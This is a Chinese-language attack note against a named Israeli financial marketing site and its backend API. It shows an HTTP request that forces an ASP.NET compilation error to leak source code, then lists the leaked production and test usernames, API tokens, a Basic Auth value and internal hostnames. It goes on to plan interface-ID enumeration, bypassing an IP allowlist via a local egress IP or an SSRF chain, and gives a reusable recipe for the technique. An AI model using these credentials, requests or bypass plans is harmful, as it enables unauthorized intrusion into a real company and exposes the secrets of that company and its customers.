# AS-Invest hdpro — Submit.ashx 编译错误泄源码 + 硬编码生产凭证

> 目标：hdpro.co.il（AS-Invest 营销接口平台，ASP.NET / .NET 4.0）
> 手法：触发 ASP.NET Compilation Error → 完整源码 + pragma checksum 泄露
> 价值：主目标生产 API 凭证 + 内部主机名 + 接口格式

## 触发方式

向 `Submit.ashx` POST 额外参数（如 `interfaceId=x`）→ 触发 ASP.NET Compilation Error，泄露完整源码。

```http
POST /Submit.ashx HTTP/1.1
Host: hdpro.co.il
Content-Type: application/x-www-form-urlencoded

phone=test&interfaceId=x
→ 500 Compilation Error
→ 响应包含完整 .ashx 源码 + #pragma checksum
```

**根因**：生产环境 `CustomErrors` 未开启 → 编译错误回显完整源码。

## 泄露的硬编码凭证

| 项 | 值 |
|---|---|
| 生产 API | `https://api.as-invest.co.il/api/v11/api.svc/json/executewithjsonandgetjsonresult/x22089` |
| 测试 API | `https://api-test.as-invest.co.il/.../x22089` |
| 生产用户名 | `ICREATEUserProd` |
| 生产 token | `650B454A-C22A-4903-B9E6-E32668217B26` |
| 测试凭证 | `ICREATEUserTest` / `C6D50170-2142-470A-B106-67D795106AD4` |
| 内部主机名 | `test-icndt-fe.altshuler.local`（Host 头） |
| iCreate CRM Basic Auth | `3ACFE06E-5AFF-43C1-82B6-2FF9080336A8` |

**源码路径**：`g:\Sites\hdpro.co.il\_inter\AS-Invest\Submit.ashx`

## 接口格式 x22089

接口编号 `x22089` 暗示可枚举 `x22088`/`x22090` 等兄弟接口 → 发现更多读写接口。
错误回显证实：`User ICREATEUserProd doesn't have execute role on interface number 22060` → 接口号枚举有效。

## 利用状态

`api.as-invest.co.il`（31.154.176.70）全端口 filtered → **IP 白名单**挡住。

凭证有效但外部无法直连。两条闭环路径：
1. **以色列出口 IP** → 直连 API
2. **SSRF 链** → 用 iCreate 服务器（可能在白名单内）→ 代理请求到 api.as-invest.co.il

## .ashx 编译错误泄源码通用手法

**适用条件**：
- ASP.NET Web Forms / Handler (.ashx/.aspx)
- 生产环境 `CustomErrors=Off` 或 `mode=RemoteOnly` 但从内部访问
- 源码内有编译器不认的语法（如 C# 6.0 字典初始化器在 .NET 4.0 上）

**触发方法**：
1. POST 额外/异常参数 → 触发代码路径异常
2. 篡改 Content-Type → 触发解析异常
3. 超大请求体 → 触发内存/编译异常

**与 aspnet-viewstate-hunt 的对照**：ViewState 泄 machineKey 走 viewstate 卡；编译错误泄源码+凭证走本卡（ashx handler 金融场景）。
